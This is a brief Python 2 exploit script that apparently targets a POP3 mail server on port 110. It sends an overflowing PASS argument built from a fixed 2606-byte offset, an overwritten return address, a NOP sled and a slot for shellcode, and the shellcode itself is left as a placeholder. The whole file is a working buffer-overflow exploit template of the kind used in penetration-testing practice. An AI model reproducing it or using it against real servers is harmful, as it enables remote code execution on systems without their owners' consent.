#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode = (
"shellcode e.g. 351 bytes"
"goes"
"here"
)

buffer = 'A'*2606 + '\x8f\x35\x4a\x5f' + '\x90'*16 + shellcode + 'C'*(3500-2606-4-351-16)

try:
  print "\nSending buffer.."
  s.connect(('x.x.x.x',110))
  data=s.recv(1024)
  s.send('USER username' + '\r\n')
  data=s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print '\nDone.'
except:
  print 'Could not connect to POP3 server!'

